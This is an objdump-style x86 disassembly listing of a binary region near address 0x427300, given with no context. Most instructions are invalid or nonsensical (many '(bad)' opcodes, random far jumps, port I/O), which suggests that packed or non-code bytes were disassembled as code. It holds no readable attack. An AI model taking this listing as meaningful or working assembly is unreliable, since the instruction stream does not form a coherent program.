  4272d8:	xchg   esi,eax
  4272d9:	out    dx,al
  4272da:	(bad)  
  4272db:	jg     0x427288
  4272dd:	repz sbb BYTE PTR cs:[esi+0x798e5709],0x3
  4272e6:	mov    ebp,0x8071250a
  4272eb:	retf   
  4272ec:	mov    ch,0xd0
  4272ee:	add    al,0xa1
  4272f0:	cmp    DWORD PTR [edx],esi
  4272f2:	in     al,dx
  4272f3:	icebp  
  4272f4:	xor    DWORD PTR [esi+0xe],ebx
  4272f7:	(bad)  
  4272f8:	retf   
  4272f9:	imul   esp,DWORD PTR [eax-0x67],0x59
  4272fd:	dec    edi
  4272fe:	cdq    
  4272ff:	xchg   al,ah
  427301:	and    ebp,DWORD PTR [edx+0x63]
  427304:	(bad)  
  427306:	mov    dh,0x6a
  427308:	push   edi
  427309:	scas   al,BYTE PTR es:[edi]
  42730a:	js     0x4272e8
  42730c:	push   cs
  42730d:	cli    
  42730e:	dec    edx
  42730f:	cmc    
  427310:	imul   esi,esp,0x8a8a9e34
  427316:	push   es
  427317:	sub    BYTE PTR [ebx+0x3e],bh
  42731a:	leave  
  42731b:	inc    ecx
  42731c:	sub    al,0x7d
  42731e:	xchg   bl,ah
  427320:	lahf   
  427321:	retf   
  427322:	stc    
  427323:	aas    
  427324:	dec    esi
  427325:	je     0x42734a
  427327:	cmc    
  427328:	mov    ds:0xc3b9b8b2,al
  42732d:	and    BYTE PTR fs:[edi+0x5e74e42c],ah
  427334:	and    eax,0x8643c9a3
  427339:	cmp    esp,DWORD PTR [eax]
  42733b:	or     eax,0x66d29d03
  427340:	pop    ebp
  427341:	mov    ebx,0xe5ab3b60
  427346:	retf   
  427347:	stos   DWORD PTR es:[edi],eax
  427348:	push   esp
  427349:	jle    0x4272f0
  42734b:	xchg   esp,eax
  42734c:	aad    0x3d
  42734e:	scas   al,BYTE PTR es:[edi]
  42734f:	jmp    0xab0ed2bb
  427354:	xor    BYTE PTR [edx+0x1e250a1e],dl
  42735a:	pop    eax
  42735b:	fadd   DWORD PTR [edi]
  42735d:	lahf   
  42735e:	sbb    eax,0xf94258c7
  427363:	mov    dh,0x7c
  427365:	pop    esi
  427366:	pop    es
  427367:	fs push esi
  427369:	add    dl,ah
  42736b:	pushf  
  42736c:	into   
  42736d:	pop    ebp
  42736e:	and    esi,esp
  427370:	inc    esp
  427371:	and    BYTE PTR [edi],ch
  427373:	xchg   ebp,eax
  427374:	cmp    BYTE PTR [esp+edi*4],0xc8
  427378:	pop    ds
  427379:	jne    0x427342
  42737b:	ds mov ah,0x4
  42737e:	inc    edx
  42737f:	jecxz  0x4273c3
  427381:	int    0x3f
  427383:	inc    esp
  427384:	pushf  
  427385:	loop   0x42734c
  427387:	or     ch,BYTE PTR [ebx-0x7228708c]
  42738d:	sbb    eax,0x9dc3057a
  427392:	sub    BYTE PTR [ecx],ah
  427394:	pop    ss
  427395:	cmc    
  427396:	or     ebx,DWORD PTR [edx-0x6c80aa5c]
  42739c:	or     DWORD PTR [ecx-0x21ea2173],ecx
  4273a2:	xor    ch,dl
  4273a4:	nop
  4273a5:	xchg   ebx,eax
  4273a6:	addr16 pop es
  4273a8:	push   edx
  4273a9:	out    0xeb,al
  4273ab:	stc    
  4273ac:	xor    BYTE PTR [edx],cl
  4273ae:	imul   esi,DWORD PTR [ecx-0x3b],0xffffffd1
  4273b2:	leave  
  4273b3:	daa    
  4273b4:	cld    
  4273b5:	jmp    0xeb872627
  4273ba:	dec    ebp
  4273bb:	or     eax,0x3c3a5d7c
  4273c0:	aaa    
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa120:0xe21fe312
  427446:	add    DWORD PTR [eax],eax
  427448:	cmc    
  427449:	add    BYTE PTR [eax],al
  42744b:	add    BYTE PTR [ecx+0x3626fd4f],bl
  427451:	pop    ecx
  427452:	fs sbb eax,0x5924e91b
  427458:	ins    BYTE PTR es:[edi],dx
  427459:	fmul   DWORD PTR [ebp-0x7f]
  42745c:	xchg   edx,eax
  42745d:	or     al,0xe7
  42745f:	xor    DWORD PTR [eax+0x14],ecx
  427462:	nop
  427463:	lock outs dx,DWORD PTR ds:[esi]
  427465:	loop   0x427418
  427467:	push   eax
  427468:	pop    edi
  427469:	jmp    0x427409
  42746b:	fnstsw WORD PTR [ecx+eax*1]
  42746e:	das    
  42746f:	pop    edi
  427470:	jmp    0xa06:0xd4c1d44f
  427477:	out    0xf4,al
  427479:	pushf  
  42747a:	aad    0x96
  42747c:	(bad)  
  42747e:	out    0x13,eax
  427480:	fistp  QWORD PTR [edi+0xf]
  427483:	pop    eax
  427484:	(bad)  
  427485:	enter  0xb724,0xa2
  427489:	mov    edx,esp
  42748b:	test   eax,0xcf53500c
  427490:	sub    eax,0xb8b77f8a
  427495:	sub    esp,DWORD PTR [ebx-0x5a]
  427498:	pop    ebp
  427499:	call   0xaa57d6e2
  42749e:	mov    edx,0xa5f9b568
  4274a3:	or     BYTE PTR [ebx-0x7d17e91c],bh
  4274a9:	shl    DWORD PTR ds:0x15a92f55,1
  4274af:	push   eax
  4274b0:	icebp  
  4274b1:	fmul   QWORD PTR ds:0x7d41acad
  4274b7:	dec    edx
  4274b8:	jb     0x4274c7
  4274ba:	xchg   ecx,eax
  4274bb:	out    dx,eax
  4274bc:	jne    0x4274bd
  4274be:	addr16 inc esi
  4274c0:	loop   0x4274f3
  4274c2:	stos   DWORD PTR es:[edi],eax
  4274c3:	mov    ecx,DWORD PTR [esi]
  4274c5:	and    bl,bh
  4274c7:	sub    edx,edi
  4274c9:	push   0xaa26df3e
  4274ce:	outs   dx,DWORD PTR ds:[esi]
  4274cf:	(bad)  
  4274d0:	jmp    0x778d51d6
  4274d5:	push   ds
  4274d6:	pushfw 
  4274d8:	aad    0xdd
  4274da:	(bad)  
  4274db:	sar    BYTE PTR [edi+0x1f15b1b1],1
  4274e1:	in     eax,dx
  4274e2:	mov    edx,0x764d9562
  4274e7:	or     BYTE PTR [ebx-0x42],0x71
  4274eb:	push   es
  4274ec:	dec    edi
  4274ed:	out    dx,al
  4274ee:	scas   al,BYTE PTR es:[edi]
  4274ef:	and    dh,ah
  4274f1:	dec    ebp
  4274f2:	jnp    0x42753e
  4274f4:	(bad)  [ebx+0x6e011e07]
  4274fa:	inc    edx
  4274fb:	pop    ecx
  4274fc:	pop    esi
  4274fd:	mov    ecx,0x17400a3b
  427502:	ja     0x4274e1
  427504:	div    BYTE PTR [esi+0x2129c440]
  42750a:	cdq    
  42750b:	xchg   edi,eax
  42750c:	dec    edx
  42750d:	out    dx,eax
  42750e:	into   
  42750f:	or     al,BYTE PTR [edi-0x73]
  427512:	ds pushf 
  427514:	nop
  427515:	ja     0x4274e9
  427517:	test   al,0xc9
  427519:	dec    ebx
  42751a:	xor    dl,BYTE PTR [edx+0x24]
  42751d:	jno    0x4274d8
  42751f:	arpl   WORD PTR [eax-0x329615cb],di
  427525:	fld    TBYTE PTR [ebp-0x5dda94af]
  42752b:	test   eax,0x7713e47b
  427530:	ror    ecx,cl
  427532:	adc    ecx,DWORD PTR [ebx+0x30]
  427535:	shl    esi,1
  427537:	jo     0x42756c
  427539:	xchg   edi,eax
  42753a:	xlat   BYTE PTR ds:[ebx]
  42753b:	mov    esi,0x2f67a459
  427540:	data16 add BYTE PTR [eax],al
	...
  4275b3:	add    BYTE PTR [edx],dl
  4275b5:	retf   
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xc99a8b87,al
  4275c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275c2:	jns    0x4275f9
  4275c4:	adc    eax,0xf50001a2
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    BYTE PTR [edi+0x1c],cl
  4275ce:	ror    DWORD PTR [eax],cl
  4275d0:	aad    0x85
  4275d2:	in     eax,dx
  4275d3:	ja     0x427595
  4275d5:	lahf   
  4275d6:	mov    edi,0x76a50eaf
  4275db:	ins    BYTE PTR es:[edi],dx
  4275dc:	inc    edx
  4275dd:	sbb    edx,DWORD PTR [ebx]
  4275df:	inc    eax
  4275e0:	test   ecx,esp
  4275e2:	test   eax,0xb5b1b56a
  4275e7:	mov    ds:0xb3109334,eax
  4275ec:	jmp    0x290a1d9a
  4275f1:	fwait
  4275f2:	test   BYTE PTR [edx],0x86
  4275f5:	mov    bh,0xda
  4275f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275f8:	or     bh,BYTE PTR [esi]
  4275fa:	out    dx,eax
  4275fb:	jns    0x427614
  4275fd:	out    dx,al
  4275fe:	push   ss
  4275ff:	push   0x2c7aa106
  427604:	cmp    BYTE PTR [edi+ebx*8],ah
  427607:	je     0x4275e7
  427609:	jl     0x4275b0
  42760b:	outs   dx,DWORD PTR ds:[esi]
  42760c:	fcomp  DWORD PTR [edi-0x7f03f03e]
  427612:	push   0x63
  427614:	std    
  427615:	pop    es
  427616:	data16 test BYTE PTR [eax-0x5db36afb],ah
  42761d:	mov    ds:0x6f85df80,al
  427622:	es or  eax,0x25921535
  427628:	xchg   ebp,eax
  427629:	push   esi
  42762a:	retf   0x80d
  42762d:	cwde   
  42762e:	jb     0x4275fa
  427630:	adc    bh,BYTE PTR [ebx]
  427632:	clc    
  427633:	pop    ss
  427634:	test   al,0x78
  427636:	shl    BYTE PTR [edi],0x4d
  427639:	and    DWORD PTR [edi-0x16cf8819],ebx
  42763f:	scas   eax,DWORD PTR es:[edi]
  427640:	test   bh,cl
  427642:	and    BYTE PTR [ebp-0x50],0x7f
  427646:	nop
  427647:	dec    bx
  427649:	adc    al,0x42
  42764b:	cmc    
  42764c:	fadd   DWORD PTR [ebp-0x14]
  42764f:	hlt    
  427650:	add    eax,0x4cc4a569
  427655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427656:	pop    ebp
  427657:	into   
  427658:	hlt    
  427659:	mov    ds:0x63a521f3,eax
  42765e:	and    DWORD PTR [ebx-0x4f],edi
  427661:	test   DWORD PTR [edi-0x597a322f],ecx
  427667:	adc    DWORD PTR [edi+0x31cb75bb],ebp
  42766d:	arpl   WORD PTR ds:0x889bbb69,dx
  427673:	cs jns 0x42761c
  427676:	push   0x2429f474
  42767b:	cmp    BYTE PTR [ecx-0x21c9f6b1],0xea
  427682:	pop    eax
  427683:	sub    ch,BYTE PTR [edi+ebp*8+0x2d]
  427687:	push   0xc67ede3b
  42768c:	pop    edi
  42768d:	test   eax,0x8ba0e8bc
  427692:	jne    0x42761c
  427694:	rcr    BYTE PTR [edi+0x5d],1
  427697:	fst    DWORD PTR [esi-0x73]
  42769a:	stos   DWORD PTR es:[edi],eax
  42769b:	inc    edx
  42769c:	xchg   edx,eax
  42769d:	mov    esp,0x27a0b567
  4276a2:	adc    DWORD PTR fs:[edi+edx*4],esi
  4276a6:	jg     0x4e6dc897
  4276ac:	mov    BYTE PTR [ebx-0x4e],bl
  4276af:	adc    dh,BYTE PTR [esi+0x4f]
  4276b2:	outs   dx,BYTE PTR ds:[esi]
  4276b4:	lock sbb ebp,DWORD PTR [esi]
  4276b7:	call   0x2237:0xb62049cc
  4276be:	pop    edx
  4276bf:	sahf   
  4276c0:	sub    al,0x0
	...
  427732:	add    BYTE PTR [eax],al
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	add    BYTE PTR [esi],ch
  427742:	cs dec edi
  427744:	or     ah,BYTE PTR [ebx+0xf50001]
  42774a:	add    BYTE PTR [eax],al
  42774c:	clc    
  42774d:	pop    edi
  42774e:	dec    ebp
  42774f:	inc    ebp
  427750:	sub    DWORD PTR [ebp-0x64a61dd2],esp
  427756:	cli    
  427757:	jae    0x4276da
  427759:	lock dec edi
  42775b:	push   cs
  42775c:	push   ebx
  42775d:	call   0x5acc0d8b
  427762:	mov    dh,0x72
  427764:	xchg   esi,eax
  427765:	jns    0x42775f
  427767:	jmp    0x9e21be9a
  42776c:	push   0xffffffda
  42776e:	outs   dx,BYTE PTR ds:[esi]
  42776f:	pop    esp
  427770:	dec    esp
  427771:	mov    ds:0xa73d3c55,eax
  427776:	push   0x45781d13
  42777b:	mov    cl,0x32
  42777d:	push   ecx
  42777e:	es std 
  427780:	fistp  QWORD PTR [edi+0x184faea8]
  427786:	ds jecxz 0x427751
  427789:	ficom  DWORD PTR [eax-0x12]
  42778c:	aad    0x79
  42778e:	dec    esi
  42778f:	(bad)  
  427790:	pop    eax
  427791:	xor    edx,0xda2571a
  427797:	pop    ebp
  427798:	and    esp,ebx
  42779a:	ror    dh,0xbd
  42779d:	sbb    DWORD PTR [ebx],ebx
  42779f:	xchg   BYTE PTR [edi+0x44],ah
  4277a2:	sub    eax,DWORD PTR [ebx+eiz*4]
  4277a5:	dec    eax
  4277a6:	sbb    DWORD PTR [ebp+ebx*1+0xfcc15f8],0x73
  4277ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277af:	xor    eax,0x63ad1416
  4277b4:	les    esi,FWORD PTR [ebx]
  4277b6:	icebp  
  4277b7:	daa    
  4277b8:	addr16 inc edx
  4277ba:	push   cs
  4277bb:	(bad)  
  4277bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277bd:	and    ch,ah
  4277bf:	xchg   edi,eax
  4277c0:	imul   ebp,DWORD PTR [edx],0xffffffc8
  4277c3:	lea    edx,[esi+eax*2+0xc]
  4277c7:	hlt    
  4277c8:	loop   0x4277a2
  4277ca:	outs   dx,BYTE PTR ds:[esi]
  4277cb:	jl     0x4277c5
  4277cd:	mov    ebp,ecx
  4277cf:	push   ss
  4277d0:	sbb    BYTE PTR [edx-0x67cf00a1],ah
  4277d6:	fist   DWORD PTR [eax]
  4277d8:	add    DWORD PTR [ebx-0x3d],edi
  4277db:	ins    DWORD PTR es:[edi],dx
  4277dc:	aaa    
  4277dd:	test   al,0x25
  4277df:	mov    ch,0xf3
  4277e1:	inc    ebx
  4277e2:	mov    ecx,0x732219d5
  4277e7:	leave  
  4277e8:	mov    bh,0xeb
  4277ea:	push   edx
  4277eb:	sub    DWORD PTR [esi-0x5d],esp
  4277ee:	adc    al,BYTE PTR [ecx-0x2e]
  4277f1:	shl    DWORD PTR [ecx+0x6f0a9297],cl
  4277f7:	inc    esi
  4277f8:	or     al,0x3f
  4277fa:	add    eax,0x627d57d1
  4277ff:	push   cs
  427800:	je     0x4277f5
  427802:	push   cs
  427803:	lods   al,BYTE PTR ds:[esi]
  427804:	fst    DWORD PTR ds:0xe6e405f6
  42780a:	daa    
  42780b:	xor    dl,dl
  42780d:	out    0x1c,eax
  42780f:	and    BYTE PTR [eax+0x6d],dh
  427812:	mov    edx,0x6b6caecc
  427817:	xchg   ecx,eax
  427818:	and    DWORD PTR [ebx+edi*1+0x2c],edi
  42781c:	xchg   ebp,esi
  42781e:	int    0xae
  427820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427821:	adc    ch,bl
  427823:	ins    BYTE PTR es:[edi],dx
  427824:	and    ebx,DWORD PTR [edi]
  427826:	xchg   esi,eax
  427827:	xor    al,ah
  427829:	fsubp  st(3),st
  42782b:	xchg   BYTE PTR [edx+0x63c627a],dl
  427831:	ret    0x4672
  427834:	jno    0x427835
  427836:	jns    0x42789a
  427838:	imul   edi,DWORD PTR [ebx],0xa7a47764
  42783e:	daa    
  42783f:	out    0x3b,al
	...
  4278b1:	add    BYTE PTR [eax],al
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
  4278bc:	dec    eax
  4278bd:	mov    ds:0x2d23918f,al
  4278c2:	adc    ah,BYTE PTR ds:0x1a3ff
  4278c8:	cmc    
  4278c9:	add    BYTE PTR [eax],al
  4278cb:	add    cl,ah
  4278cd:	push   edi
  4278ce:	or     ecx,0x90afb216
  4278d4:	mov    ch,0xbc
  4278d6:	or     eax,0x17aa8faf
  4278db:	or     eax,0xfe3cb4e
  4278e0:	xor    ah,BYTE PTR [esi+ebp*2+0x53]
  4278e4:	push   ebx
  4278e5:	call   0xb566:0x8bb412b2
  4278ec:	xchg   edi,eax
  4278ed:	push   eax
  4278ee:	(bad)  [ecx-0x53]
  4278f1:	adc    bh,BYTE PTR cs:[ebp*2+0x4fb99c79]
  4278f9:	sbb    eax,0xa0c030ba
  4278fe:	mov    eax,ds:0x75206f68
  427903:	ficomp WORD PTR [edi+ebp*1-0x1e]
  427907:	push   ebp
  427908:	mov    esp,0x85aad126
  42790d:	push   esp
  42790e:	jmp    DWORD PTR [eax+0x52]
  427911:	aaa    
  427912:	inc    ebx
  427913:	adc    eax,0x93d40235
  427918:	xchg   BYTE PTR [edx],bh
  42791a:	int    0x25
  42791c:	aam    0x80
  42791e:	cmp    eax,eax
  427920:	leave  
  427921:	or     ecx,DWORD PTR [edx]
  427923:	mov    esi,0x8c17061f
  427928:	mov    dh,ah
  42792a:	enter  0x4a0a,0x76
  42792e:	clc    
  42792f:	(bad)  
  427930:	dec    edx
  427931:	je     0x427994
  427933:	(bad)  [edx+0x679b9b3a]
  427939:	test   BYTE PTR [eax],dl
  42793b:	and    edx,DWORD PTR [ebx+0x6ffe2577]
  427941:	mov    ds:0xabb67991,eax
  427946:	adc    BYTE PTR ds:0x35684b2c,0x46
  42794d:	test   al,0xec
  42794f:	mov    ds:0x3d92f5da,eax
  427954:	imul   eax,DWORD PTR [esi+0xcde5a14],0xffffffcc
  42795b:	outs   dx,BYTE PTR ds:[esi]
  42795c:	xor    ecx,DWORD PTR [ebp+0x5b977438]
  427962:	push   edx
  427963:	int3   
  427964:	push   ebp
  427965:	pusha  
  427966:	arpl   WORD PTR [bp+di+0x1f],di
  42796a:	pop    si
  42796c:	push   edx
  42796d:	jae    0x42797d
  42796f:	xchg   edx,eax
  427970:	mov    ecx,0xb0213504
  427975:	cmp    al,0xeb
  427977:	dec    edi
  427978:	sub    BYTE PTR [edx-0x49],bh
  42797b:	dec    ebx
  42797c:	pop    esp
  42797d:	xor    al,0xc1
  42797f:	bound  eax,QWORD PTR [ebp+0x5b90b25f]
  427985:	mov    edx,0x52bb3d2
  42798a:	sbb    ch,bl
  42798c:	popa   
  42798d:	sti    
  42798e:	lds    eax,FWORD PTR [ecx+0x44]
  427991:	pushf  
  427992:	loopne 0x427977
  427994:	ds mov dh,0x61
  427997:	out    dx,al
  427998:	sti    
  427999:	mov    bl,0x37
  42799b:	outs   dx,DWORD PTR ds:[esi]
  42799c:	(bad)
  42799f:	test   eax,0x1b29dd9f
  4279a4:	daa    
  4279a5:	dec    ebx
  4279a6:	fs xchg esi,eax
  4279a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279a9:	sti    
  4279aa:	xor    al,0xe8
  4279ac:	cs or  bl,dl
  4279af:	popf   
  4279b0:	mov    ebp,0x9d432173
  4279b5:	or     al,0x7c
  4279b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279b8:	lock dec ebx
  4279ba:	jbe    0x427a25
  4279bc:	push   ss
  4279bd:	sbb    ebp,ebx
  4279bf:	add    edx,DWORD PTR [eax+0x0]
	...
  427a31:	add    BYTE PTR [eax],al
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x6d
  427a41:	fwait
  427a42:	ss push edi
  427a44:	hlt    
  427a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a46:	add    DWORD PTR [eax],eax
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    bl,ah
  427a4d:	fild   WORD PTR [eax]
  427a4f:	pushf  
  427a50:	mov    edi,0x8e4cdb7
  427a55:	pop    edx
  427a56:	ins    DWORD PTR es:[edi],dx
  427a57:	adc    ebp,ebp
  427a59:	dec    esi
  427a5a:	ja     0x427acb
  427a5c:	icebp  
  427a5d:	inc    ecx
  427a5e:	push   ebp
  427a5f:	das    
  427a60:	out    0xf5,eax
  427a62:	ss add esp,esp
  427a65:	ins    DWORD PTR es:[edi],dx
  427a66:	shl    DWORD PTR [ebx+ebp*8],cl
  427a69:	pop    ecx
  427a6a:	and    eax,0x1b083d11
  427a6f:	vsubps xmm4,xmm2,XMMWORD PTR [edx+edi*2]
  427a74:	xchg   ecx,eax
  427a75:	out    0x73,eax
  427a77:	sub    bl,BYTE PTR [ebp-0x2e52628]
  427a7d:	pop    edx
  427a7e:	sbb    esp,0xddc08afa
  427a84:	jne    0x427aae
  427a86:	xchg   ecx,eax
  427a87:	jno    0x427a2d
  427a89:	sbb    al,0x34
  427a8b:	sbb    bl,dh
  427a8d:	push   cs
  427a8e:	inc    ecx
  427a8f:	sbb    BYTE PTR [esi-0xc18c52e],bl
  427a95:	out    0x79,eax
  427a97:	in     eax,0xf2
  427a99:	jmp    0x427ae2
  427a9b:	inc    ebx
  427a9c:	lock cdq 
  427a9e:	(bad)  [edx]
  427aa0:	adc    DWORD PTR [edi-0x3d],ecx
  427aa3:	jne    0x427a99
  427aa5:	xchg   ebx,eax
  427aa6:	mov    DWORD PTR [edi-0x8],ebx
  427aa9:	inc    ebp
  427aaa:	std    
  427aab:	pop    edx
  427aac:	stc    
  427aad:	mov    ebx,0x25a9b0ea
  427ab2:	push   0x17743711
  427ab7:	mov    ecx,0xf075599
  427abc:	push   esi
  427abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427abe:	je     0x427a42
  427ac0:	scas   al,BYTE PTR es:[edi]
  427ac1:	push   es
  427ac2:	test   BYTE PTR [ecx],bl
  427ac4:	lahf   
  427ac5:	dec    ecx
  427ac6:	pop    edx
  427ac7:	inc    eax
  427ac8:	xchg   esp,eax
  427ac9:	inc    ebx
  427aca:	ss out 0xc8,al
  427acd:	in     eax,0xb3
  427acf:	sub    BYTE PTR [eax],bh
  427ad1:	dec    esp
  427ad2:	das    
  427ad3:	mov    al,0x8d
  427ad5:	xor    ecx,DWORD PTR [ebx+0x7b830a30]
  427adb:	in     eax,dx
  427adc:	mov    esi,0x2e31a37f
  427ae1:	pop    ds
  427ae2:	fdivr  QWORD PTR [edi]
  427ae4:	fidivr DWORD PTR [ebx]
  427ae6:	in     eax,0xff
  427ae8:	jecxz  0x427a72
  427aea:	sub    al,0x9c
  427aec:	in     eax,0x5b
  427aee:	call   0x8d11168d
  427af3:	inc    edi
  427af4:	int    0xe0
  427af6:	retf   0xaa5d
  427af9:	inc    ecx
  427afa:	shl    ebx,cl
  427afc:	data16 (bad) 
  427afe:	(bad)  
  427aff:	dec    edi
  427b00:	jmp    0xc925:0xa826fd73
  427b07:	cmp    DWORD PTR [esp+edx*2-0x70],esi
  427b0b:	out    dx,eax
  427b0c:	sub    DWORD PTR ds:0xdb0997bc,eax
  427b12:	scas   eax,DWORD PTR es:[edi]
  427b13:	stos   DWORD PTR es:[edi],eax
  427b14:	and    DWORD PTR [esi+0x5ca0a5d3],edx
  427b1a:	test   BYTE PTR [ecx],dh
  427b1c:	and    DWORD PTR [edx],0xffffffef
  427b1f:	(bad)  
  427b20:	cwde   
  427b21:	inc    ecx
  427b22:	repnz lods eax,DWORD PTR ds:[esi]
  427b24:	mov    esi,0x4f55952
  427b29:	outs   dx,DWORD PTR fs:[esi]
  427b2b:	div    BYTE PTR [esi-0x5f]
  427b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b2f:	inc    ecx
  427b30:	mov    fs,ecx
  427b32:	sbb    DWORD PTR [edx+0x7f9ff41c],ebp
  427b38:	or     dh,dl
  427b3a:	test   eax,0x26b218f1
  427b3f:	iret   
  427b40:	add    BYTE PTR fs:[eax],al
	...
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x8114fe65
  427bc1:	cmp    esp,DWORD PTR [ecx-0x5e]
  427bc4:	jmp    0xf5427d6e
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    cl,al
  427bcd:	sbb    dh,0x32
  427bd0:	(bad)  
  427bd1:	bound  esi,QWORD PTR [ebx-0x65692a3d]
  427bd7:	inc    esi
  427bd8:	ret    
  427bd9:	clc    
  427bda:	in     al,dx
  427bdb:	add    bl,dh
  427bdd:	cli    
  427bde:	xchg   esi,eax
  427bdf:	daa    
  427be0:	mov    ds,WORD PTR [ecx]
  427be2:	push   es
  427be3:	sub    eax,0xb67f082e
  427be8:	add    eax,0x16f523e3
  427bed:	jbe    0x427b73
  427bef:	imul   ebp,DWORD PTR [esi],0xe0f16014
  427bf5:	ins    BYTE PTR es:[edi],dx
  427bf6:	stos   BYTE PTR es:[edi],al
  427bf7:	retf   0xa19f
  427bfa:	sbb    BYTE PTR [edx+0x4a598e6e],bl
  427c00:	inc    ebp
  427c01:	imul   edi,DWORD PTR [ecx+0x7c],0x79744cb9
  427c08:	jge    0x427bc5
  427c0a:	xor    ecx,DWORD PTR [ecx-0x4b]
  427c0d:	mov    ds:0x99edfd4f,eax
  427c12:	(bad)  
  427c14:	fldcw  WORD PTR [ebx+ecx*1]
  427c17:	sub    al,bl
  427c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c1a:	mov    al,0x51
  427c1c:	inc    edx
  427c1d:	loopne 0x427bda
  427c1f:	mov    al,ds:0x27b06968
  427c24:	in     eax,0x12
  427c26:	not    BYTE PTR [eax+0x5bd1636a]
  427c2c:	mov    al,ds:0x76a20be5
  427c31:	in     al,dx
  427c32:	into   
  427c33:	push   eax
  427c34:	push   ebx
  427c35:	dec    esi
  427c36:	loope  0x427c9f
  427c38:	inc    BYTE PTR gs:[eax+0x6920688c]
  427c3f:	mov    edx,0xe00df70d
  427c44:	jne    0x427c8f
  427c46:	std    
  427c47:	or     DWORD PTR [ecx+ebx*4+0x2e21f920],edx
  427c4e:	sbb    ebp,DWORD PTR [edx-0x4f8dcf90]
  427c54:	mov    WORD PTR ds:0xe5c78659,?
  427c5a:	test   BYTE PTR [edx-0x6d31f3f],ch
  427c60:	pop    esi
  427c61:	dec    eax
  427c62:	popf   
  427c63:	stos   BYTE PTR es:[edi],al
  427c64:	mov    ebp,0xb2698c81
  427c69:	in     eax,dx
  427c6a:	sub    eax,0x3004d80
  427c6f:	cmp    ebx,DWORD PTR [ecx+edx*1+0x3c]
  427c73:	cmp    al,0x6d
  427c75:	cwde   
  427c76:	aaa    
  427c77:	jns    0x427ca2
  427c79:	pop    esi
  427c7a:	ror    BYTE PTR [ebx-0x17629205],1
  427c80:	lea    esp,[ebx-0x1e3d2eed]
  427c86:	push   eax
  427c87:	xchg   esp,eax
  427c88:	jns    0x427c17
  427c8a:	pusha  
  427c8b:	fidivr WORD PTR [edi]
  427c8d:	inc    eax
  427c8e:	cmp    ecx,esp
  427c90:	mov    ebp,0xd2632e7e
  427c95:	pop    eax
  427c96:	pop    ds
  427c97:	mov    ebp,0xfebb5e97
  427c9c:	repnz or DWORD PTR [eax-0x33],ebx
  427ca0:	adc    DWORD PTR [eax+ebp*8+0x51],ebp
  427ca4:	or     al,0xb5
  427ca6:	or     DWORD PTR [ebx-0x4],ebx
  427ca9:	ja     0x427d29
  427cab:	dec    esp
  427cac:	ror    BYTE PTR [ebx+ebx*1-0x11],1
  427cb0:	add    cl,BYTE PTR [ebx+0x23744610]
  427cb6:	jae    0x427d28
  427cb8:	fisttp WORD PTR [edx]
  427cba:	sub    al,0xb2
  427cbc:	test   al,0x1f
  427cbe:	sbb    BYTE PTR [ebx],bh
  427cc0:	push   ds
	...
  427d31:	add    BYTE PTR [eax],al
  427d33:	add    BYTE PTR [edx],cl
  427d35:	mov    cl,0x61
  427d37:	repz sti 
  427d39:	repz call 0x3ea1:0xdc63ecf9
  427d41:	ja     0x427d95
  427d43:	stos   DWORD PTR es:[edi],eax
  427d44:	fisub  WORD PTR [esi+0xf50001]
  427d4a:	add    BYTE PTR [eax],al
  427d4c:	jns    0x427d69
  427d4e:	fisubr WORD PTR [ecx-0x16]
  427d51:	jnp    0x427d05
  427d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d54:	and    DWORD PTR [ebp-0x7e],ebp
  427d57:	hlt    
  427d58:	shl    DWORD PTR [edx-0xc8568d0],0x4e
  427d5f:	xor    BYTE PTR [edi+ebp*8],dh
  427d62:	dec    esi
  427d63:	mov    eax,ds:0x148e8028
  427d68:	pop    esp
  427d69:	out    dx,al
  427d6a:	mov    edx,0xec23e20d
  427d6f:	add    ebx,edx
  427d71:	mov    WORD PTR [ebx+0x18],ss
  427d74:	dec    esp
  427d75:	out    dx,eax
  427d76:	imul   ecx,ecx,0xffffffde
  427d79:	fidivr DWORD PTR [ecx-0x1f]
  427d7c:	jo     0x427d00
  427d7e:	in     al,0x65
  427d80:	cmc    
  427d81:	push   edi
  427d82:	shl    DWORD PTR [ecx+0x17],cl
  427d85:	(bad)  
  427d86:	stos   BYTE PTR es:[edi],al
  427d87:	(bad)  
  427d89:	mov    ebx,0xaa6d4eb2
  427d8e:	cmp    eax,0x723449ce
  427d93:	mov    ah,0xf7
  427d95:	mov    dh,0x9
  427d97:	cmp    BYTE PTR [edi],dh
  427d99:	add    DWORD PTR [ecx],ebp
  427d9b:	iret   
  427d9c:	mov    cl,0xb
  427d9e:	fwait
  427d9f:	ins    BYTE PTR es:[edi],dx
  427da0:	adc    al,0x46
  427da2:	inc    edx
  427da3:	dec    ecx
  427da4:	mov    ds:0x124bcc3,eax
  427da9:	xchg   esp,eax
